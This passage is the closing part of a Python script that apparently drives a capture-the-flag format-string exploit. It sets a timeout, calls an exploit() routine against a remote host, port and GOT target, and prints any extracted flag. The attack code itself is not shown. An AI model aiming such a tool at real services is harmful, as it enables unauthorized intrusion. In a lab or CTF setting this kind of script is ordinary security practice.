    def _alarm(s: int, f: Any) -> None:
        print("[-] Timeout exceeded", file=sys.stderr); sys.exit(1)
    try:
        signal.signal(signal.SIGALRM, _alarm)
        signal.alarm(args.timeout)
    except (AttributeError, ValueError):
        pass

    flag = exploit(binary_path, args.remote_host, args.remote_port,
                   args.flag_format, args.input_limit, args.got_target)
    if flag:
        print(f"EXTRACTED FLAG: {flag}")
        sys.exit(0)
    else:
        print("[-] Format string write exploitation failed", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
